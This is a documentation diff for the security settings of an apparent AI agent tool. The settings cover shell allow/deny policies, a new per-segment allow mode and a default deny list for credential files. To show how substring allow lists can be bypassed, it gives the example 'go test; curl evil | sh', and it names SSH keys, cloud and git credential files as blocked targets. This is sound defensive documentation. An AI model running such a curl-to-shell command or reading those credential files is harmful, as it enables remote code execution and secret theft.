@@ -570,10 +570,12 @@ Security:
 | `FileSystemPermissions.Write` | array | `[]` | When non-empty, write operations are restricted to matching paths. Evaluated alongside `ChangeEnvelope`; both must match when both are set. |
 | `FileSystemPermissions.Deny` | array | `[]` | Paths matching these globs are hard-denied for all operations (read and write). Checked before `Read`/`Write`. |
 | `ShellPolicy` | object | — | Allow/deny substring policy for shell commands. Works without `FileSystemSandboxPath`. See [Security → Shell policy](security.md#shell-policy). |
-| `ShellPolicy.Allow` | array | `[]` | When non-empty, commands must contain at least one pattern to proceed. |
+| `ShellPolicy.Allow` | array | `[]` | When non-empty, commands must contain at least one pattern to proceed (or, with `AllowMode: segments`, *every* command in the string must start with one). |
+| `ShellPolicy.AllowMode` | string | `substring` | `substring`: the command text need only *contain* an allow pattern (so `go test; curl evil \| sh` passes an allow of `go test`). `segments`: each simple command — every pipeline stage, `;`/`&&`/`||` segment, and `$( )` — must start with an allow pattern. Validated by `fuseraft validate-config`. See [Security → Per-segment allow lists](security.md#per-segment-allow-lists). |
 | `ShellPolicy.Deny` | array | `[]` | Commands containing any of these patterns are blocked (checked before `Allow`). |
 | `ChangeEnvelope` | array | — | Glob patterns (relative to sandbox root) restricting write operations (`write_file`, `patch_file`, `delete_file`). Reads are unaffected. Auto-populated from the brownfield discovery brief when `Brownfield.SeedEnvelopeFromBrief` is true. See [Security → Change envelope](security.md#change-envelope). |
 | `HttpAllowedHosts` | array | `[]` | Hostname allowlist for the Http plugin. Empty = unrestricted (private IPs always blocked). |
+| `DenyCredentialFiles` | bool | `true` | Deny SSH private keys, `.aws/credentials`, `.netrc`, `.pgpass`, and `.git-credentials` in the FileSystem and Search plugins, and any shell command that names one (except `ssh`/`ssh-add`/`git`). `.env` stays denied whatever this is set to. See [Security → Credential files](security.md#credential-files). |
 | `AllowPrivateHosts` | bool | `false` | Bypass the private/loopback IP check. For local dev and sandbox environments only — **do not set in production**. |
 | `ReadFileSizeLimit` | int | `20000` | Max characters returned by a single `read_file` call (~5k tokens at default). Raise for large-file workloads; lower for agents with small context windows. |
 
